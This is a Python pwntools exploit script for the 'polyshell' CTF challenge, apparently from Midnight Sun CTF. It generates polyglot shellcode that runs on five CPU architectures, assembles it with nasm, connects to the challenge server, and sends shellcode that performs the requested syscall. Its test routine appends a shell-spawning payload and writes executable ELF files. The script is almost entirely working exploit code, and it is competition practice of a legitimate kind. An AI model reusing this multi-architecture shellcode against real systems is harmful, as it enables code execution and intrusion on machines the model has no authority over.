#
# Author: Jakub (MrQubo) Nowak
#
import os
from pwn import *

context.update(log_level='debug')


syscall_num = 'SYS_write'
arg1 = 0x1337
arg2 = '01234'

replace = ''


all_archs = [
    dict(sc = shellcraft.i386, arch = 'i386', label = '_x86_32', sp = 'esp'),
    dict(sc = shellcraft.amd64, arch = 'amd64', label = '_x86_64', sp = 'rsp'),
    dict(sc = shellcraft.arm, arch = 'arm', label = '_arm', sp = 'sp', align = 4),
    dict(sc = shellcraft.aarch64, arch = 'aarch64', label = '_arm64', sp = 'sp', align = 4),
    dict(sc = shellcraft.mips, arch = 'mips', label = '_mips', sp = '$sp', align = 4),
]

no_mipsel_archs = all_archs[:-1]


def hexmap(b):
    return map(lambda c: '%02x' % ord(c), b)

def hex_str(b):
    return ''.join(hexmap(b))

def hex_nasm_db(b):
    return 'db ' + ','.join(map(lambda c: '0x' + c, hexmap(b)))


def get_nasm_syscall_code(arch):
    sc = arch['sc']
    s = ''
    s += sc.pushstr(arg2, append_null=True)
    s += sc.linux.syscall(syscall_num, arg1, arch['sp'])
    b = asm(s, arch = arch['arch'])
    return hex_nasm_db(b)


def get_nasm_syscall_write_code(arch):
    sc = arch['sc']
    s = ''
    s += sc.pushstr(arg2, append_null=True)
    s += sc.linux.syscall('SYS_write', 1, arch['sp'], len(arg2))
    s += sc.sh() # there's no infloop() on mips
    b = asm(s, arch = arch['arch'])
    return hex_nasm_db(b)


def construct_nasm_code(archs, construct_nasm_arch_code):
    code = ''
    with open('poc.asm', 'r') as f:
        code += f.read() % dict(replace = replace)
    code += '\n'

    for arch in archs:
        if 'align' in arch:
            code += '    times (%(align)s - (($ - _start) %% %(align)s)) nop\n' % arch
        code += arch['label']
        code += ':\n'
        code += '    '
        code += construct_nasm_arch_code(arch)
        code += '\n'

    return code


def compile_nasm(s):
    with open('_nasm.asm', 'w') as f:
        f.write(s)

    os.system('nasm -f bin -o _nasm.bin _nasm.asm')

    with open('_nasm.bin', 'r') as f:
        b = f.read()

    return b


def test_archs(archs):
    s = construct_nasm_code(archs, get_nasm_syscall_write_code)
    b = compile_nasm(s)

    write_elfs(b, archs)

    for arch in archs:
        try:
            with run_shellcode(b, arch=arch['arch']) as p:
                if (p.recv(timeout=1) != arg2):
                    return False
        except:
            return False

        print(arch['arch'] + ': Test successful')

    return True


def exec_sploit(archs):
    global syscall_num, arg1, arg2

    with remote('polyshell-01.play.midnightsunctf.se', 30000) as p:
        p.recvuntil(['Syscall number: '])
        syscall_num = int(p.recvline())
        p.recvuntil(['Argument 1: '])
        arg1 = int(p.recvline())
        p.recvuntil(['Argument 2: A pointer to the string "'])
        arg2 = p.recvuntil(['"'], drop=True)

        s = construct_nasm_code(archs, get_nasm_syscall_code)
        b = compile_nasm(s)
        s = hex_str(b)

        p.send(s)
        print(p.recvall())


def write_elfs(b, archs):
    for arch in archs:
        elf_name = 'elf-' + arch['arch']
        ELF.from_bytes(b, arch=arch['arch']).save(elf_name)
        os.chmod(elf_name, 0755)


exec_sploit(all_archs)
#  test_archs(all_archs)
